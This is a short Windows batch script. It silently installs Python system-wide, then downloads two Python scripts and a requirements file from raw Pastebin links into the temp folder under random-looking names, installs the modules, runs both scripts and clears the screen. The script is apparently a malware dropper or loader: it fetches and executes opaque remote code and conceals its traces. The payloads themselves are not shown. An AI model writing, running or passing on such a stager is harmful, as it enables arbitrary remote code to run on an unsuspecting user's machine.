::Installs Python 
powershell -command "Invoke-WebRequest -UseBasicParsing -Uri https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe -OutFile c:/veera/python-3.11.0-amd64.exe"
.\python-3.11.0-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
setx /M path "%path%;C:\Program Files\Python311"
$env:PATH =$env:PATH+";C:\Program Files\Python311"

::Downloads python file from online
cd %TEMP%
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/UYEunxDk -Outfile dkjawndknadw.py"
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/MmV5DfXQ -Outfile awhjdjkawdna.py"
powershell -Command "Invoke-WebRequest https://pastebin.com/raw/rH2xpu8E -Outfile hahjsdbahdba.txt"

::Installs modules required
pip install -r hahjsdbahdba.txt

::Executes python file
python awhjdjkawdna.py
python dkjawndknadw.py

cls
